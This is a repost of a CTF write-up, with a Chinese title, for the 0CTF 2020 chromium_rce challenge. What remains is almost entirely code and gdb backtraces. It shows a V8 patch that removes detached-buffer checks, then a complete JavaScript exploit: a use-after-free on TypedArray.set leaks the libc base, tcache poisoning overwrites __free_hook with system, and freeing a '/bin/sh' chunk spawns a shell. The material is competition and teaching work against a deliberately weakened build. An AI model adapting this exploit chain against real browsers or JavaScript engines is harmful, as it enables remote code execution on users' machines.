# 沙箱逃逸之0ctf2020 chromium_rce writeup

> 原文: https://www.ctfiot.com/94732.html
> ID: 94732


```
$ ls
d8snapshot_blob.bintctf.diff
```



```
git checkout f7a1932ef928c190de32dd78246f75bd4ca8778b
gclient sync
git apply < ../tctf.diff
tools/dev/gm.py x64.release
tools/dev/gm.py x64.debug
```



```
typedarray.set(array[, offset])
typedarray.set(typedarray[, offset])
```



```
var buffer = new ArrayBuffer(8);
var uint8 = new Uint8Array(buffer);

uint8.set([1,2,3], 3);

console.log(uint8); // Uint8Array [ 0, 0, 0, 1, 2, 3, 0, 0 ]
```



```
diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..babe7da3f0 100644
--- a/src/builtins/typed-array-set.tq
+++ b/src/builtins/typed-array-set.tq
@@ -70,7 +70,7 @@ TypedArrayPrototypeSet(
     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
     //   exception.
-   const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
+   const utarget = %RawDownCast<AttachedJSTypedArray>(target);

     const overloadedArg = arguments[0];
     try {
@@ -86,8 +86,7 @@ TypedArrayPrototypeSet(
       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
       //   exception.
-     const utypedArray =
-         typed_array::EnsureAttached(typedArray) otherwise IsDetached;
+     const utypedArray = %RawDownCast<AttachedJSTypedArray>(typedArray);

       TypedArrayPrototypeSetTypedArray(
           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
```



```
// builtins/typed-array.tq: 168
macro EnsureAttached(array: JSTypedArray): AttachedJSTypedArray
    labels Detached {
  if (IsDetachedBuffer(array.buffer)) goto Detached;
  return %RawDownCast<AttachedJSTypedArray>(array);
}
```



```
--- a/src/parsing/parser-base.h
+++ b/src/parsing/parser-base.h
@@ -1907,10 +1907,8 @@ ParserBase<Impl>::ParsePrimaryExpression() {
       return ParseTemplateLiteral(impl()->NullExpression(), beg_pos, false);

     case Token::MOD:
-     if (flags().allow_natives_syntax() || extension_ != nullptr) {
-       return ParseV8Intrinsic();
-     }
-     break;
+     // Directly call %ArrayBufferDetach without `--allow-native-syntax` flag
+     return ParseV8Intrinsic();

     default:
       break;
diff --git a/src/parsing/parser.cc b/src/parsing/parser.cc
index 9577b37397..2206d250d7 100644
--- a/src/parsing/parser.cc
+++ b/src/parsing/parser.cc
@@ -357,6 +357,11 @@ Expression* Parser::NewV8Intrinsic(const AstRawString* name,
   const Runtime::Function* function =
       Runtime::FunctionForName(name->raw_data(), name->length());

+ // Only %ArrayBufferDetach allowed
+ if (function->function_id != Runtime::kArrayBufferDetach) {
+   return factory()->NewUndefinedLiteral(kNoSourcePosition);
+ }
+
   // Be more permissive when fuzzing. Intrinsics are not supported.
   if (FLAG_fuzzing) {
     return NewV8RuntimeFunctionForFuzzing(function, args, pos);
```



```
let a = new Uint8Array(0x200);
let b = new Uint8Array(0x200);
%ArrayBufferDetach(a.buffer); // into tcache
a.set(b) // overwrite a's fd, write to freed mem
b.set(a) // read from freed mem
```



```
#0 __libc_calloc (n=0x600, elem_size=0x1) at malloc.c:3366#1 0x00007f3b7fbd411c in v8::(anonymous namespace)::ArrayBufferAllocator::Allocate (this=0x5600e01d5af0, length=0x600) at ../../src/api/api.cc:546#2 0x00005600e013ba6f in v8::(anonymous namespace)::ArrayBufferAllocatorBase::Allocate (this=0x7fff5cf95c40, length=0x600) at ../../src/d8/d8.cc:120#3 0x00005600e013b8ec in v8::(anonymous namespace)::ShellArrayBufferAllocator::Allocate (this=0x7fff5cf95c40, length=0x600) at ../../src/d8/d8.cc:141#4 0x00007f3b8034cfa1 in v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0::operator()(unsigned long) const (this=0x7fff5cf94228, byte_length=0x600) at ../../src/objects/backing-store.cc:238#5 0x00007f3b8034cf22 in std::__Cr::__invoke<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0&, unsigned long> (__f=..., __args=@0x7fff5cf940a0: 0x600) at ../../buildtools/third_party/libc++/trunk/include/type_traits:3529#6 0x00007f3b8034cee2 in std::__Cr::__invoke_void_return_wrapper<void*>::__call<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0&, unsigned long>(v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0&, unsigned long&&) (__args=@0x7fff5cf940a0: 0x600, __args=@0x7fff5cf940a0: 0x600) at ../../buildtools/third_party/libc++/trunk/include/__functional_base:317#7 0x00007f3b8034cea0 in std::__Cr::__function::__default_alloc_func<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0, void* (unsigned long)>::operator()(unsigned long&&) (this=0x7fff5cf94228, __arg=@0x7fff5cf940a0: 0x600) at ../../buildtools/third_party/libc++/trunk/include/functional:1590#8 0x00007f3b8034ce66 in std::__Cr::__function::__policy_invoker<void* (unsigned long)>::__call_impl<std::__Cr::__function::__default_alloc_func<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0, void* (unsigned long)> >(std::__Cr::__function::__policy_storage const*, unsigned long) (__buf=0x7fff5cf94228, __args=0x600) at ../../buildtools/third_party/libc++/trunk/include/functional:2071#9 0x00007f3b800c810e in std::__Cr::__function::__policy_func<void* (unsigned long)>::operator()(unsigned long&&) const (this=0x7fff5cf94228, __args=@0x7fff5cf94100: 0x600) at ../../buildtools/third_party/libc++/trunk/include/functional:2203#10 0x00007f3b800999b0 in std::__Cr::function<void* (unsigned long)>::operator()(unsigned long) const (this=0x7fff5cf94228, __arg=0x600) at ../../buildtools/third_party/libc++/trunk/include/functional:2473#11 0x00007f3b80082dc0 in v8::internal::Heap::AllocateExternalBackingStore(std::__Cr::function<void* (unsigned long)> const&, unsigned long) (this=0x2c4a000097b0, allocate=..., byte_length=0x600) at ../../src/heap/heap.cc:2908#12 0x00007f3b8034a1e6 in v8::internal::BackingStore::Allocate (isolate=0x2c4a00000000, byte_length=0x600, shared=v8::internal::SharedFlag::kNotShared, initialized=v8::internal::InitializedFlag::kZeroInitialized) at ../../src/objects/backing-store.cc:252#13 0x00007f3b7fd00277 in v8::internal::(anonymous namespace)::ConstructBuffer (isolate=0x2c4a00000000, target=..., new_target=..., length=..., initialized=v8::internal::InitializedFlag::kZeroInitialized) at ../../src/builtins/builtins-arraybuffer.cc:56#14 0x00007f3b7fcfde82 in v8::internal::Builtin_Impl_ArrayBufferConstructor (args=..., isolate=0x2c4a00000000) at ../../src/builtins/builtins-arraybuffer.cc:92#15 0x00007f3b7fcfd69e in v8::internal::Builtin_ArrayBufferConstructor (args_length=0x6, args_object=0x7fff5cf946f8, isolate=0x2c4a00000000) at ../../src/builtins/builtins-arraybuffer.cc:70#16 0x00007f3b7f75563f in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit () from /home/f0cus77/work/pwn/v8/v8/out/x64.debug/libv8.so#17 0x00007f3b7f51e265 in Builtins_JSBuiltinsConstructStub () from /home/f0cus77/work/pwn/v8/v8/out/x64.debug/libv8.so#18 0x00002c4a08246ac9 in ?? ()#19 0x00002c4a08246ac9 in ?? ()#20 0x000000000000000c in ?? ()#21 0x00002c4a08040385 in ?? ()#22 0x0000000000000c00 in ?? ()#23 0x00002c4a08040385 in ?? ()#24 0x0000000000000002 in ?? ()#25 0x00002c4a08240229 in ?? ()#26 0x0000000000000024 in ?? ()#27 0x00007fff5cf947a8 in ?? ()#28 0x00007f3b7f96b1d8 in Builtins_CreateTypedArray () from /home/f0cus77/work/pwn/v8/v8/out/x64.debug/libv8.so
```



```
let a = {};a.length = size; // malloc sizereturn new Uint8Array(a);
```



```
#0 __GI___libc_malloc (bytes=0x60) at malloc.c:3023#1 0x00007f9a9622a157 in v8::(anonymous namespace)::ArrayBufferAllocator::AllocateUninitialized (this=0x55978bd6daf0, length=0x60) at ../../src/api/api.cc:557#2 0x000055978b4d3aaf in v8::(anonymous namespace)::ArrayBufferAllocatorBase::AllocateUninitialized (this=0x7ffc940df460, length=0x60) at ../../src/d8/d8.cc:124#3 0x000055978b4d394c in v8::(anonymous namespace)::ShellArrayBufferAllocator::AllocateUninitialized (this=0x7ffc940df460, length=0x60) at ../../src/d8/d8.cc:146#4 0x00007f9a969a2f76 in v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0::operator()(unsigned long) const (this=0x7ffc940ddbc8, byte_length=0x60) at ../../src/objects/backing-store.cc:236#5 0x00007f9a969a2f22 in std::__Cr::__invoke<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0&, unsigned long> (__f=..., __args=@0x7ffc940dda40: 0x60) at ../../buildtools/third_party/libc++/trunk/include/type_traits:3529#6 0x00007f9a969a2ee2 in std::__Cr::__invoke_void_return_wrapper<void*>::__call<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0&, unsigned long>(v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0&, unsigned long&&) (__args=@0x7ffc940dda40: 0x60, __args=@0x7ffc940dda40: 0x60) at ../../buildtools/third_party/libc++/trunk/include/__functional_base:317#7 0x00007f9a969a2ea0 in std::__Cr::__function::__default_alloc_func<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0, void* (unsigned long)>::operator()(unsigned long&&) (this=0x7ffc940ddbc8, __arg=@0x7ffc940dda40: 0x60) at ../../buildtools/third_party/libc++/trunk/include/functional:1590#8 0x00007f9a969a2e66 in std::__Cr::__function::__policy_invoker<void* (unsigned long)>::__call_impl<std::__Cr::__function::__default_alloc_func<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0, void* (unsigned long)> >(std::__Cr::__function::__policy_storage const*, unsigned long) (__buf=0x7ffc940ddbc8, __args=0x60) at ../../buildtools/third_party/libc++/trunk/include/functional:2071#9 0x00007f9a9671e10e in std::__Cr::__function::__policy_func<void* (unsigned long)>::operator()(unsigned long&&) const (this=0x7ffc940ddbc8, __args=@0x7ffc940ddaa0: 0x60) at ../../buildtools/third_party/libc++/trunk/include/functional:2203#10 0x00007f9a966ef9b0 in std::__Cr::function<void* (unsigned long)>::operator()(unsigned long) const (this=0x7ffc940ddbc8, __arg=0x60) at ../../buildtools/third_party/libc++/trunk/include/functional:2473#11 0x00007f9a966d8dc0 in v8::internal::Heap::AllocateExternalBackingStore(std::__Cr::function<void* (unsigned long)> const&, unsigned long) (this=0x1420000097b0, allocate=..., byte_length=0x60) at ../../src/heap/heap.cc:2908#12 0x00007f9a969a01e6 in v8::internal::BackingStore::Allocate (isolate=0x142000000000, byte_length=0x60, shared=v8::internal::SharedFlag::kNotShared, initialized=v8::internal::InitializedFlag::kUninitialized) at ../../src/objects/backing-store.cc:252#13 0x00007f9a96356277 in v8::internal::(anonymous namespace)::ConstructBuffer (isolate=0x142000000000, target=..., new_target=..., length=..., initialized=v8::internal::InitializedFlag::kUninitialized) at ../../src/builtins/builtins-arraybuffer.cc:56#14 0x00007f9a963542bf in v8::internal::Builtin_Impl_ArrayBufferConstructor_DoNotInitialize (args=..., isolate=0x142000000000) at ../../src/builtins/builtins-arraybuffer.cc:104#15 0x00007f9a96353fae in v8::internal::Builtin_ArrayBufferConstructor_DoNotInitialize (args_length=0x6, args_object=0x7ffc940ddf48, isolate=0x142000000000) at ../../src/builtins/builtins-arraybuffer.cc:99#16 0x00007f9a95dab63f in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit () from /home/f0cus77/work/pwn/v8/v8/out/x64.debug/libv8.so#17 0x00007f9a95fbed6c in Builtins_CreateTypedArray ()
```



```
// Allocate a backing store using the array buffer allocator from the embedder.std::unique_ptr<BackingStore> BackingStore::Allocate( Isolate* isolate, size_t byte_length, SharedFlag shared, InitializedFlag initialized) { ... auto allocate_buffer = [allocator, initialized](size_t byte_length) { if (initialized == InitializedFlag::kUninitialized) { return allocator->AllocateUninitialized(byte_length); } void* buffer_start = allocator->Allocate(byte_length); ... return buffer_start; };
```



```
function calloc(size){ let uint8 = new Uint8Array(size); return uint8;}function malloc(size){ var malloc_size = {}; malloc_size.length = size; let uint8 = new Uint8Array(malloc_size); return uint8;}function free(ptr){ %ArrayBufferDetach(ptr.buffer);}function write64(ptr, offset, val){ let dv = new DataView(ptr.buffer); dv.setBigInt64(offset, val, true); return;}function read64(ptr, offset){ let dv = new DataView(ptr.buffer); val = dv.getBigInt64(offset, true); return val;}
```



```
// calloc a big chunk with 0x600let leak_ptr = calloc(0x600);let read_ptr = calloc(0x600);// calloc a chunk with /bin/sh stringlet gap = calloc(0x100);write64(gap, 0, 0x68732f6e69622fn);// free big chunk to unsorted_binfree(leak_ptr);// uaf to leak libc addressread_ptr.set(leak_ptr);let libc_base = read64(read_ptr, 8) - 0x1ebbe0n;console.log("[+] libc base: 0x"+hex(libc_base));
```



```
// malloc tcache chunk with 0x60let evil_ptr = malloc(0x60);// malloc another tcache chunk with 0x60let evil_ptr1 = malloc(0x60);let write_ptr = malloc(0x60);// deploy a chunk with free_hook addr contentwrite64(write_ptr, 0, free_hook);// free 0x60 chunk to tcache, tcache count is 1;free(evil_ptr1);// free evil chunk to tcache, tcache count is 2;free(evil_ptr);// set tcache chunk fd to free_hook addr;evil_ptr.set(write_ptr);// malloc out the first chunk, tcache count is 1;let reserved_ptr = malloc(0x60);// malloc out free_hook chunk, tcache count is 0;let free_hook_ptr = malloc(0x60);
```



```
// write system addr to free_hookwrite64(free_hook_ptr, 0, system_addr);// free mem with /bin/sh to get shell.free(gap);
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1675126303.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/2-1675126304.png)